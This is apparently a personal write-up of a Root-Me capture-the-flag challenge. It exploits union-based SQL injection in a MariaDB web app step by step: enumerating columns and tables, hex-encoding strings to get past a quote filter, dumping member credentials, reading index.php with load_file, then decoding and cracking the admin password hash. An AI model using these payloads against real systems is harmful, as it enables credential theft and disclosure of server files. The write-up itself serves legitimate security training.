## **In this challenge, the goal is to exploit an SQL injection to retrieve admin password.**

#### After Testing multiple parameters we found our desired one 
```
http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1
```
![[Pasted image 20251113092159.png]]
- lets make an error 
![[Pasted image 20251113092234.png]]
- we have got an interesting information this a mariaDB (My sql) 

#### Lets find number of columns 
```
ORDER BY 1#  OK
ORDER BY 2#  OK
ORDER BY 3#  OK
ORDER BY 4#  OK
ORDER BY 5#  Error
```
- we know for sure there are 4 columns
![[Pasted image 20251113092552.png]]
#### Making sure of the version
```
-1 UNION SELECT @@version,null,null,null#
```
![[Pasted image 20251113092729.png]]

## Lets Find table name
```
-1 UNION SELECT table_name, null,null,null FROM information_schema.tables #
```
- no luck with this query we have to search for other one for maria db 
![[Pasted image 20251113093108.png]]
```
-1 UNION SELECT table_name, null,null,null FROM information_schema.tables WHERE table_schema = database()# 
```
- table name : `member`
![[Pasted image 20251113093200.png]]

#### lets get columns names 
```
UNION SELECT column_name, null,null,null FROM information_schema.columns WHERE table_name ="member"# 

UNION SELECT column_name, null,null,null FROM information_schema.columns WHERE table_name ='member'# 
```
![[Pasted image 20251113093358.png]]
- i even tried 
```
UNION SELECT column_name, null,null,null FROM information_schema.columns WHERE table_name = member# 
```
![[Pasted image 20251113093619.png]]
- after searching for a while i found out that we have to encode it to hexdecimal
![[Pasted image 20251113093800.png]]

```
-1 UNION SELECT null,null,null,group_concat(column_name) from information_schema.columns where table_name=0x6d656d626572#
```
![[Pasted image 20251113093848.png]]
#### lets get the password 
```
-1 UNION SELECT null,null,null,group_concat(member_id,member_login,member_password,member_email) from member#
```
![[Pasted image 20251113093942.png]]
```
VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==
```
- no luck on decoding it
![[Pasted image 20251113094101.png]]
#### lets read the file as the challenge is requiring 
- the problem is i don't know which file but from other root me challenges its always index.php and since there is a filter as we saw before we havt to convert to hexdecimal
```
-1 UNION SELECT null,null,null,load_file(0x696e6465782e706870)#
```
![[Pasted image 20251113094416.png]]
- nothing so it requires a full path i guess so i searched for it and i found out its 
```
/challenge/web-serveur/ch31/index.php
-1 UNION SELECT null,null,null,load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870)#
```
![[Pasted image 20251113094710.png]]
![[Pasted image 20251113094646.png]]

```
$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
stringxor($key, base64_decode($data['member_password'])))
```
- so we have to decode it as 64 then stringxor with the key we got from the file 

![[Pasted image 20251113094910.png]]

#### lets crack the hash 
```
77be4fc97f77f5f48308942bb6e32aacabed9cef
```
![[Pasted image 20251113094956.png]]

```
superpassword
```

![[Pasted image 20251113095040.png]]